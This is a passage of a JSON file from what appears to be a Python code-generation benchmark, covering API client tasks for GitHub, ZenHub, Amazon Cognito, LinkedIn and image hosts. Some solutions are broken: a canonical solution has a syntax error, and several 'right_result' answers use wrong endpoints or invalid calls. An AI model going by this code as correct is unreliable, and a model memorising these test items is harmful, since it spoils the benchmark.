    "Instruction": "Task Description: Create a Python function to interact with GitHub and ZenHub APIs to retrieve repository, board, and issue information.\n\nFunction Description: The function will make HTTP requests to GitHub and ZenHub APIs to fetch specific data about repositories, boards, and issues. It handles authentication, sends requests, checks responses, and returns the parsed data.\n\nInput:\n- github_token: [str] - GitHub personal access token for authentication\n- github_org: [str] - GitHub organization name\n- github_repo: [str] - GitHub repository name\n- zenhub_token: [str] - ZenHub API token for authentication\n- issue_number: [int] - GitHub issue number to query (for issue-related functions)\n\nOutput:\n- For get_github_repo_id: [int] - Returns the GitHub repository ID\n- For get_zenhub_board: [dict] - Returns the ZenHub board data as a dictionary\n- For get_github_issue: [dict] - Returns GitHub issue data as a dictionary\n- For get_zenhub_issue_info: [dict] - Returns ZenHub issue information as a dictionary\n\nMethods:\n1. get_github_repo_id(github_token, github_org, github_repo) -> int - Retrieves the repository ID from GitHub API\n2. get_zenhub_board(zenhub_token, github_repo_id) -> dict - Fetches ZenHub board data for a given repository ID\n3. get_github_issue(github_token, github_org, github_repo, issue_number) -> dict - Gets GitHub issue details\n4. get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number) -> dict - Retrieves ZenHub-specific issue information",
    "Canonical_solution": "import requests\nimport os\n\nGITHUB_API_URL = \"https://api.github.com\"\nGITHUB_GRAPHQL_URL = \"https://api.github.com/graphql\"\nZENHUB_API_URL = \"https://api.zenhub.com/p1/repositories/{repo_id}/board\"\n\ndef get_github_repo_id(github_token, github_org, github_repo):\n    url = f\"{GITHUB_API_URL}/repos/{github_org}/{github_repo}\"\n    headers = {\n        \"Authorization\": github_token\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json().get(\"id\")\n    else:\n        response.raise_for_status()\n\ndef get_zenhub_board(zenhub_token, github_repo_id):\n    url = ZENHUB_API_URL.format(repo_id=github_repo_id)\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Authentication-Token\": zenhub_token\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        response.raise_for_status()\n\ndef get_github_issue(github_token, github_org, github_repo, issue_number):\n    url = f\"https://api.github.com/repos/{github_org}/{github_repo}/issues/{issue_number}\"\n    headers = {\n        \"Authorization\": f\"token {github_token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        response.raise_for_status()\n\ndef get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number):\n    url = f\"https://api.zenhub.com/p1/repositories/{github_repo_id}/issues/{issue_number}\"\n    headers = {\n        \"X-Authentication-Token\": zenhub_token,\n        \"Accept\": \"application/json\"\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    elif response.status_code == 403:\n        print(\"Rate limit exceeded. Sleeping for 1 minute\")\n    else:\n        response.raise_for_status()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef get_github_repo_id(github_token, github_org, github_repo):\n    url = f\"https://api.github.com/orgs/{github_org}/repos/{github_repo}\"\n    headers = {\"Authorization\": f\"token {github_token}\"}\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()['id']\n    else:\n        return None\n\ndef get_zenhub_board(zenhub_token, github_repo_id):\n    url = f\"https://api.zenhub.com/api/v1/boards?filter=repos&repo_id={github_repo_id}\"\n    headers = {\"Authorization\": f\"token {zenhub_token}\"}\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None\n\ndef get_github_issue(github_token, github_org, github_repo, issue_number):\n    url = f\"https://api.github.com/repos/{github_org}/{github_repo}/issues/{issue_number}\"\n    headers = {\"Authorization\": f\"token {github_token}\"}\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None\n\ndef get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number):\n    url = f\"https://api.zenhub.com/api/v1/issues/{github_repo_id}/{issue_number}\"\n    headers = {\"Authorization\": f\"token {zenhub_token}\"}\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        return None"
  },
  {
    "Task_id": 93,
    "Instruction": "Task Description: Implement a Python class for interacting with Amazon Cognito's OAuth2 endpoints to handle Single Sign-On (SSO) functionality, including token management and user information retrieval.\n\nClass Description: The AmazonSSO class provides methods to authenticate users via Amazon Cognito, refresh access tokens, and retrieve user information. It handles OAuth2 flows including authorization code and refresh token grants.\n\nAttributes:\n- access_token: str - The OAuth2 access token for API authorization\n- refresh_token: str - The refresh token used to obtain new access tokens\n- client_id: str - AWS Cognito application client ID\n- client_secret: str - AWS Cognito application client secret\n- user_pool_id: str - AWS Cognito user pool identifier\n- region: str - AWS region where the user pool is hosted\n- user_info: dict - Dictionary containing user profile information\n\nMethods:\n- __init__(access_token: str = None, refresh_token: str = None) -> None - Initializes the AmazonSSO instance with optional tokens\n- get_new_token() -> str - Obtains a new access token using the refresh token\n- get_user_info() -> dict - Retrieves user information using the current access token\n- amazon_sso(code: str, redirect_uri: str = None) -> tuple[AmazonSSO, None] | tuple[None, None] - Static method that exchanges an authorization code for tokens",
    "Canonical_solution": "import requests\nimport logging\nfrom fastapi import HTTPException\nfrom Globals import getenv\n\nclass AmazonSSO:\n    def __init__(\n        self,\n        access_token=None,\n        refresh_token=None,\n    ):\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = getenv(\"AWS_CLIENT_ID\")\n        self.client_secret = getenv(\"AWS_CLIENT_SECRET\")\n        self.user_pool_id = getenv(\"AWS_USER_POOL_ID\")\n        self.region = getenv(\"AWS_REGION\")\n        self.user_info = self.get_user_info()\n\n    def get_new_token(self):\n        response = requests.post(\n            f\"https://{self.user_pool_id}.auth.{self.region}.amazoncognito.com/oauth2/token\",\n            data={\n                \"client_id\": self.client_id,\n                \"client_secret\": self.client_secret,\n                \"refresh_token\": self.refresh_token,\n                \"grant_type\": \"refresh_token\",\n                \"scope\": \"openid email profile\",\n            },\n        )\n        return response.json()[\"access_token\"]\n\n    def get_user_info(self):\n        uri = f\"https://{self.user_pool_id}.auth.{self.region}.amazoncognito.com/oauth2/userInfo\"\n        response = requests.get(\n            uri,\n            headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n        )\n        if response.status_code == 401:\n            self.access_token = self.get_new_token()\n            response = requests.get(\n                uri,\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n        try:\n            data = response.json()\n            first_name = data.get(\"given_name\", \"\")\n            last_name = data.get(\"family_name\", \"\")\n            email = data[\"email\"]\n            return {\n                \"email\": email,\n                \"first_name\": first_name,\n                \"last_name\": last_name,\n            }\n        except:\n            raise HTTPException(\n                status_code=400,\n                detail=\"Error getting user info from AWS\",\n            )\n\n    @staticmethod\n    def amazon_sso(code, redirect_uri=None):\n        if not redirect_uri:\n            redirect_uri = getenv(\"MAGIC_LINK_URL\")\n        code = (\n            str(code)\n            .replace(\"%2F\", \"/\")\n            .replace(\"%3D\", \"=\")\n            .replace(\"%3F\", \"?\")\n            .replace(\"%3D\", \"=\")\n        )\n        response = requests.post(\n            f\"https://{getenv('AWS_USER_POOL_ID')}.auth.{getenv('AWS_REGION')}.amazoncognito.com/oauth2/token\",\n            data={\n                \"client_id\": getenv(\"AWS_CLIENT_ID\"),\n                \"client_secret\": getenv(\"AWS_CLIENT_SECRET\"),\n                \"code\": code,\n                \"grant_type\": \"authorization_code\",\n                \"redirect_uri\": redirect_uri,\n            },\n        )\n        if response.status_code != 200:\n            logging.error(f\"Error getting AWS access token: {response.text}\")\n            return None, None\n        data = response.json()\n        access_token = data[\"access_token\"]\n        refresh_token = data[\"refresh_token\"]\n        return AmazonSSO(access_token=access_token, refresh_token=refresh_token)",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "class AmazonSSO:\n    def __init__(self, access_token: str = None, refresh_token: str = None) -> None:\n        self.access_token = access_token\n        self.refresh_token = refresh_token\n        self.client_id = \"\"\n        self.client_secret = \"\"\n        self.user_pool_id = \"\"\n        self.region = \"\"\n        self.user_info = {}\n\n    def get_new_token(self) -> str:\n        import requests\n        token_url = f\"https://{self.region}.auth.amazonaws.com/oauth2/token\"\n        data = {\n            \"grant_type\": \"refresh_token\",\n            \"client_id\": self.client_id,\n            \"client_secret\": self.client_secret,\n            \"refresh_token\": self.refresh_token\n        }\n        response = requests.post(token_url, data=data)\n        if response.status_code == 200:\n            return response.json().get(\"access_token\")\n        return \"\"\n\n    def get_user_info(self) -> dict:\n        import requests\n        user_info_url = f\"https://{self.region}.auth.amazonaws.com/userInfo\"\n        headers = {\n            \"Authorization\": f\"Bearer {self.access_token}\"\n        }\n        response = requests.get(user_info_url, headers=headers)\n        if response.status_code == 200:\n            return response.json()\n        return {}\n\n    @staticmethod\n    def amazon_sso(code: str, redirect_uri: str = None) -> tuple[\"AmazonSSO\", None] | tuple[None, None]:\n        import requests\n        auth_url = \"https://login.amazon.com/oauth2/authorize\"\n        token_url = \"https://login.amazon.com/oauth2/token\"\n        client_id = \"amzn.1234567890abcdef1234567890abcdef\"\n        client_secret = \"abcdef1234567890abcdef1234567890abcde\"\n        user_pool_id = \"us-east-1_1234567890abcdef\"\n        region = \"us-east-1\"\n\n        params = {\n            \"response_type\": \"code\",\n            \"client_id\": client_id,\n            \"redirect_uri\": redirect_uri or \"http://localhost:8000\",\n            \"scope\": \"aws.cognito.signin.user.admin\"\n        }\n        auth_response = requests.get(auth_url, params=params)\n        if \"code\" in auth_response.url:\n            data = {\n                \"grant_type\": \"authorization_code\",\n                \"client_id\": client_id,\n                \"client_secret\": client_secret,\n                \"code\": code,\n                \"redirect_uri\": redirect_uri or \"http://localhost:8000\"\n            }\n            token_response = requests.post(token_url, data=data)\n            if token_response.status_code == 200:\n                tokens = token_response.json()\n                instance = AmazonSSO(tokens.get(\"access_token\"), tokens.get(\"refresh_token\"))\n                instance.client_id = client_id\n                instance.client_secret = client_secret\n                instance.user_pool_id = user_pool_id\n                instance.region = region\n                return (instance, None)\n        return (None, None)"
  },
  {
    "Task_id": 94,
    "Instruction": "Task Description: Create a function that sends an HTTP POST request to a specified URL with given headers and data, and returns the response status code and content.\n\nFunction Description: The function uses the Python `requests` library to send an HTTP POST request to the provided URL. It includes custom headers and sends the data in JSON format. The function then returns the HTTP status code and the response body as text.\n\nInput:  \n- `url` (str): The target URL to which the POST request will be sent.  \n- `headers` (dict): A dictionary containing HTTP headers to be included in the request.  \n- `data` (dict): A dictionary containing the data to be sent in the request body, which will be converted to JSON format.  \n\nOutput:  \n- Returns a tuple containing:  \n  - `status_code` (int): The HTTP status code of the response (e.g., 200, 404, 500).  \n  - `response_text` (str): The response body as plain text.",
    "Canonical_solution": "import requests\nimport json\n\ndef send_http_request(url, headers, data):\n    response = requests.post(url, headers=headers, data=json.dumps(data))\n    return response.status_code, response.text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import requests\n\ndef send_post_request(url, headers, data):\n    response = requests.post(url, headers=headers, json=data)\n    return response.status_code, response.text"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Implement a LinkedIn API toolkit class that provides functionality to interact with LinkedIn's API for creating posts, deleting posts, and retrieving user profile information.\n\nClass Description: The LinkedInToolkit class encapsulates LinkedIn API operations including post creation, post deletion, and profile retrieval. It handles authentication using an access token and manages API requests and responses.\n\nAttributes:\n_access_token: str - Stores the LinkedIn API access token retrieved from environment variables.\n\nMethods:\n__init__() -> None - Initializes the LinkedInToolkit instance by obtaining the access token.\ncreate_post(text: str) -> Dict - Creates a new LinkedIn post with the given text content.\ndelete_post(post_id: str) -> str - Deletes a LinkedIn post specified by its post ID.\nget_profile(include_id: bool = False) -> Dict - Retrieves the user's LinkedIn profile information.\n_get_access_token() -> str - Private method to retrieve the LinkedIn access token from environment variables.",
    "Canonical_solution": "import json\nimport os\nfrom http import HTTPStatus\nfrom typing import List, Dict\nimport requests\n\nclass LinkedInToolkit:\n    def __init__(self):\n        self._access_token = self._get_access_token()\n\n    def create_post(self, text: str) -> Dict:\n        url = 'https://api.linkedin.com/v2/ugcPosts'\n        urn = self.get_profile(include_id=True)\n\n        headers = {\n            'X-Restli-Protocol-Version': '2.0.0',\n            'Content-Type': 'application/json',\n            'Authorization': f'Bearer {self._access_token}',\n        }\n\n        post_data = {\n            \"author\": urn['id'],\n            \"lifecycleState\": \"PUBLISHED\",\n            \"specificContent\": {\n                \"com.linkedin.ugc.ShareContent\": {\n                    \"shareCommentary\": {\"text\": text},\n                    \"shareMediaCategory\": \"NONE\",\n                }\n            },\n            \"visibility\": {\n                \"com.linkedin.ugc.MemberNetworkVisibility\": \"PUBLIC\"\n            },\n        }\n\n        response = requests.post(\n            url, headers=headers, data=json.dumps(post_data)\n        if response.status_code == 201:\n            post_response = response.json()\n            post_id = post_response.get('id', None)\n            return {'Post ID': post_id, 'Text': text}\n        else:\n            raise Exception(\n                f\"Failed to create post. Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    def delete_post(self, post_id: str) -> str:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            \"Content-Type\": \"application/json\",\n        }\n\n        response = requests.delete(\n            f\"https://api.linkedin.com/v2/ugcPosts/{post_id}\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.NO_CONTENT:\n            return (\n                f\"Request returned error: \"\n                f\"{response.status_code} {response.text}\"\n            )\n\n        return f\"Post deleted successfully. Post ID: {post_id}.\"\n\n    def get_profile(self, include_id: bool = False) -> Dict:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            'Connection': 'Keep-Alive',\n            'Content-Type': 'application/json',\n            \"X-Restli-Protocol-Version\": \"2.0.0\",\n        }\n\n        response = requests.get(\n            \"https://api.linkedin.com/v2/userinfo\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.OK:\n            raise Exception(\n                f\"Failed to retrieve profile. \"\n                f\"Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n        json_response = response.json()\n\n        locale = json_response.get('locale', {})\n        country = locale.get('country', 'N/A')\n        language = locale.get('language', 'N/A')\n\n        profile_report = {\n            \"Country\": country,\n            \"Language\": language,\n            \"First Name\": json_response.get('given_name'),\n            \"Last Name\": json_response.get('family_name'),\n            \"Email\": json_response.get('email'),\n        }\n\n        if include_id:\n            profile_report['id'] = f\"urn:li:person:{json_response['sub']}\"\n\n        return profile_report\n\n    def _get_access_token(self) -> str:\n        token = os.getenv(\"LINKEDIN_ACCESS_TOKEN\")\n        if not token:\n            return \"Access token not found. Please set LINKEDIN_ACCESS_TOKEN.\"\n        return token",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "right_result": "import os\nimport requests\n\nclass LinkedInToolkit:\n    def __init__(self):\n        self._access_token = self._get_access_token()\n\n    def _get_access_token(self) -> str:\n        return os.getenv('LINKEDIN_ACCESS_TOKEN')\n\n    def create_post(self, text: str) -> dict:\n        url = \"https://api.linkedin.com/v2/shares\"\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\",\n            \"Content-Type\": \"application/json\",\n            \"X-Requested-By\": \"app\"\n        }\n        payload = {\n            \"content\": {\n                \"text\": text\n            },\n            \"visibility\": {\n                \"code\": \"anyone\"\n            }\n        }\n        response = requests.post(url, headers=headers, json=payload)\n        return response.json()\n\n    def delete_post(self, post_id: str) -> str:\n        url = f\"https://api.linkedin.com/v2/shares/{post_id}\"\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\",\n            \"X-Requested-By\": \"app\"\n        }\n        response = requests.delete(url, headers=headers)\n        return response.status_code\n\n    def get_profile(self, include_id: bool = False) -> dict:\n        url = \"https://api.linkedin.com/v2/profiles/(me)\"\n        headers = {\n            \"Authorization\": f\"Bearer {self._access_token}\",\n            \"X-Requested-By\": \"app\"\n        }\n        params = {\"include\": \"id\" if include_id else \"\"}\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a function to fetch all repositories from a GitHub organization using the GitHub API.\n\nFunction Description: The function `fetch_github_repos` asynchronously retrieves all repositories belonging to a specified GitHub organization. It handles pagination to ensure all repositories are fetched, even if they span multiple pages. The function uses the GitHub REST API with proper authentication and headers.\n\nInput:\n- `org_name` (str): The name of the GitHub organization whose repositories are to be fetched.\n- `token` (str): A GitHub personal access token for authentication.\n\nOutput:\n- Returns a list of dictionaries, where each dictionary represents a repository from the organization. Returns an empty list if the request fails or no repositories are found.",
    "Canonical_solution": "import requests\ntoken = \"YOUR_GITHUB_TOKEN\"\n\nasync def fetch_github_repos(org_name, token):\n    url = f\"https://api.github.com/orgs/{org_name}/repos\"\n    headers = {\n        \"Accept\": \"application/vnd.github+json\",\n        \"Authorization\": f\"Bearer {token}\",\n        \"X-GitHub-Api-Version\": \"2022-11-28\",\n    }\n\n    params = {\n        \"per_page\": 100  # You can adjust this number (max is 100)\n    }\n\n    all_repos = []\n\n    while url:\n        response = requests.get(url, headers=headers, params=params)\n\n        if response.status_code == 200:\n            repos = response.json()\n            all_repos.extend(repos)\n\n            # Check if there is a 'next' page\n            if \"next\" in response.links:\n                url = response.links[\"next\"][\"url\"]\n            else:\n                url = None\n        else:\n            print(\n                f\"Failed to fetch repositories: {response.status_code} - {response.text}\"\n            )\n            break\n\n    return all_repos",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import asyncio\nimport requests\n\nasync def fetch_github_repos(org_name, token):\n    url = f\"https://api.github.com/orgs/{org_name}/repos\"\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/json\"\n    }\n    repos = []\n    page = 1\n    while True:\n        params = {\"page\": page, \"per_page\": 100}\n        response = await asyncio.get_event_loop().run_in_executor(None, requests.get, url, headers=headers, params=params)\n        if response.status_code == 200:\n            data = response.json()\n            if not data:\n                break\n            repos.extend(data)\n            page += 1\n        else:\n            print(f\"Failed to fetch repositories: {response.status_code}\")\n            break\n    return repos"
  },
  {
    "Task_id": 99,
    "Instruction": "Task Description: Create a function to convert a PyTorch tensor to a base64-encoded PNG image and upload it to a specified image hosting service (either SM.MS or imgbb.com) using their respective APIs, returning the hosted image URL.\n\nFunction Description: The function should accept a PyTorch tensor and an API key, convert the tensor to a PNG image, encode it in base64, and upload it to the specified image hosting service. It should handle different response formats from the services and return the hosted image URL or an error message.\n\nInput:\n- image_tensor: torch.Tensor - A PyTorch tensor representing the image to be uploaded\n- api_key: str - The API key for authenticating with the image hosting service\n- service: str (optional) - The image hosting service to use ('smms' or 'imgbb'). Defaults to 'smms'\n\nOutput:\n- str - The URL of the uploaded image on success, or an error message string on failure\n- None - Returned when the input is not a PyTorch tensor or when the upload fails without an error message",
    "Canonical_solution": "import base64\nimport requests\nfrom io import BytesIO\nfrom PIL import Image\nimport numpy as np\nimport torch\n\ndef tensor_to_url_sm(image_tensor, api_key):\n    \"\"\"\n    \u5c06PyTorch\u5f20\u91cf\u8f6c\u6362\u4e3aPNG\u683c\u5f0f\u7684base64\u7f16\u7801\u5b57\u7b26\u4e32\u5e76\u4e0a\u4f20\u81f3SM.MS\u56fe\u5e8a\uff0c\u8fd4\u56de\u4e0a\u4f20\u540e\u7684\u56fe\u7247URL\u3002\n    \n    \u53c2\u6570:\n    - image_tensor: PyTorch\u5f20\u91cf\u3002\n    - api_key: SM.MS API\u5bc6\u94a5\u3002\n    \n    \u8fd4\u56de:\n    - \u56fe\u7247\u4e0a\u4f20\u6210\u529f\u540e\u7684URL\u6216\u5df2\u5b58\u5728\u7684\u56fe\u7247URL\uff0c\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56deNone\u3002\n    \"\"\"\n    if isinstance(image_tensor, torch.Tensor):\n        i = 255.0 * image_tensor.cpu().numpy()\n    else:\n        raise TypeError(\"Input should be a PyTorch Tensor.\")\n\n    img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n    buffered = BytesIO()\n    img.save(buffered, format=\"PNG\")\n    img_str = base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n\n    files = {'smfile': ('image.png', base64.b64decode(img_str), 'image/png')}\n    headers = {'Authorization': api_key}\n\n    try:\n        response = requests.post('https://sm.ms/api/v2/upload', files=files, headers=headers)\n        response.raise_for_status()\n        \n        result = response.json()\n        if result['success']:\n            return result['data']['url']\n        elif result.get('code') == 'image_repeated':\n            return result['images']\n        else:\n            print(f\"Error: {result.get('message')}\")\n            return None\n    except requests.exceptions.RequestException as e:\n        print(f\"HTTP Request Error: {e}\")\n        return None\n\ndef tensor_to_url_imgbb(image_tensor, api_key):\n    \"\"\"\n    \u5c06PyTorch\u5f20\u91cf\u8f6c\u6362\u4e3aPNG\u683c\u5f0f\u7684base64\u7f16\u7801\u5b57\u7b26\u4e32\u5e76\u4e0a\u4f20\u81f3imgbb.com\u56fe\u5e8a\uff0c\u8fd4\u56de\u4e0a\u4f20\u540e\u7684\u56fe\u7247URL\u3002\n\n    \u53c2\u6570:\n    - image_tensor: PyTorch\u5f20\u91cf\u3002\n    - api_key: imgbb.com API\u5bc6\u94a5\u3002\n\n    \u8fd4\u56de:\n    - \u56fe\u7247\u4e0a\u4f20\u6210\u529f\u540e\u7684URL\u6216\u5df2\u5b58\u5728\u7684\u56fe\u7247URL\uff0c\u5982\u679c\u5931\u8d25\u5219\u8fd4\u56deNone\u3002\n    \"\"\"\n    if isinstance(image_tensor, torch.Tensor):\n        i = 255.0 * image_tensor.cpu().numpy()\n    else:\n        raise TypeError(\"Input should be a PyTorch Tensor.\")\n\n    img = Image.fromarray(np.clip(i, 0, 255).astype(np.uint8))\n    buffered = BytesIO()\n    img.save(buffered, format=\"PNG\")\n    img_str = base64.b64encode(buffered.getvalue()).decode(\"utf-8\")\n    url = \"https://api.imgbb.com/1/upload\"\n    payload = {\"key\": api_key, \"image\": img_str}\n    response = requests.post(url, data=payload)\n    if response.status_code == 200:\n        result = response.json()\n        img_url = result[\"data\"][\"url\"]\n        return img_url\n    else:\n        return \"Error: \" + response.text",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "right_result": "import torch\nimport base64\nimport requests\n\ndef upload_image(image_tensor, api_key, service='smms'):\n    if not isinstance(image_tensor, torch.Tensor):\n        return None\n    \n    # Convert tensor to PIL image\n    image = image_tensor.permute(1, 2, 0).detach().cpu().numpy()\n    image = (image * 255).astype('uint8')\n    from PIL import Image\n    pil_image = Image.fromarray(image)\n    \n    # Convert PIL image to base64\n    buffered = pil_image.getvalue()\n    encoded = base64.b64encode(buffered).decode('utf-8')\n    \n    # Upload to the specified service\n    if service == 'smms':\n        url = 'https://sm.ms/api/v2/upload'\n        payload = {'sm:token': api_key, 'image': encoded}\n        response = requests.post(url, data=payload)\n    elif service == 'imgbb':\n        url = 'https://api.imgbb.com/1/upload'\n        payload = {'key': api_key, 'image': encoded}\n        response = requests.post(url, data=payload)\n    else:\n        return \"Invalid service specified\"\n    \n    # Handle response\n    if response.status_code == 200:\n        try:\n            data = response.json()\n            if 'data' in data and 'url' in data['data']:\n                return data['data']['url']\n            else:\n                return \"Image upload failed\"\n        except ValueError:\n            return \"Invalid response format\"\n    else:\n        return f\"Upload failed with status code {response.status_code}\""
  }
]